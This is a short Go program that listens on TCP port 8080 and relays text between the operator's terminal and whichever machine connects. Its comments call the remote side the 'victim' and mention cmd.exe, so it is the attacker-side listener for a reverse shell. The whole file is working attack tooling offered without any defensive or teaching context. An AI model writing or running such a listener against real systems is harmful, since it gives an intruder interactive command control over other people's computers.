package main

import (
	"fmt"
	"io"
	"net"
	"os"
)

func main() {
	ln, err := net.Listen("tcp", "0.0.0.0:8080")
	if err != nil {
		fmt.Println("listen error:", err)
	}
	fmt.Println("waiting for connection on :8080")

	conn, err := ln.Accept()
	if err != nil {
		fmt.Println("accept error:", err)
	}
	fmt.Println("shell connected from:", conn.RemoteAddr())
	// user -> TCP -> victim stdin
	go io.Copy(conn, os.Stdin)
	// victim stdout/cmd.exe -> TCP -> user
	io.Copy(os.Stdout, conn)
}
